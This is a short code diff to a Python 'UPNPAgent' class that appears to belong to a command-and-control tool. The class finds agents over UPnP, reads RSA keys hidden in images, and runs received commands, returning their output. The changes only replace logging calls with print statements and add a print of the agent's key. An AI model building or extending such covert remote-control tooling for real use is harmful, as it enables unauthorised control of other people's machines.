@@ -120,7 +120,7 @@ class UPNPAgent:
                 stdout, stderr = process.communicate()
                 self.queue_message((stdout + "\n" + stderr + "\n").encode('utf8'))
             elif command == ord('m'):
-                log.info("Received C2 Message %s", message_content.decode('utf8'))
+                print("Received C2 Message %s", message_content.decode('utf8'))
             
 
     def _start_agent_search(self):
@@ -168,8 +168,9 @@ class UPNPAgent:
                                             n_bytes = secret_pixel.extract_bytes(content)
                                             if n_bytes and len(n_bytes) == utils.RSA_BIT_STRENGTH // 8:
                                                 public_key = utils.public_key_from_n(n_bytes)
+                                                print("New Agent N:", public_key.public_numbers().n)
                                                 self.agents[ip] = public_key
-                                                log.debug(f"Found agent at %s.", ip)                     
+                                                print(f"Found agent at {ip}.")                     
                                         except Exception as e:
                                             log.error("1Error %s reading message from %s", e, ip)
                                     else:
